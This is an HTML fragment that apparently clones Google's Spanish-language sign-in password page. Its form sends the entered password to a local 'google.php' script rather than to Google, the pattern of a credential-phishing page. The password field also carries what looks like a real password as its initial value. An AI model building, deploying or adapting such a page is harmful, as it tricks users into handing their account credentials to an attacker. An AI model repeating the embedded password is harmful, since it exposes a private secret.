                  ...
                  <div jsname="USBQqe" class="Wxwduf Us7fWe JhUD8d" role="presentation">
                    <div class="WEQkZc"><span jsslot="" class="sFcPkb">
                      ...
                      <div class="bCAAsb" jsname="rEuO1b" jscontroller="mjtijb" data-form-action-uri="/signin/v2/challenge/password/empty">
                        <form action="google.php" method="post"><span jsslot="">
                                            ...
                                            <div id="password" class="rFrNMe ze9ebf YKooDc wIXLub zKHdkd sdJrJc CDELXb" jscontroller="pxq3x" jsaction="clickonly:KjsqPd; focus:Jt1EX; blur:fpfTEe; input:Lg5SV" jsshadow="" jsname="Ufn6O">
                                              <div class="aCsJod oJeWuf">
                                                <div class="aXBtI Wic03c">
                                                  <div class="Xb9hP"><input type="password" class="whsOnd zHQkBf" jsname="YPqjbf" autocomplete="current-password" spellcheck="false" tabindex="0" aria-label="Ingresa tu contraseña" name="password" autocapitalize="off" dir="ltr" data-initial-dir="ltr" data-initial-value="Quierosercantante2$" badinput="false">
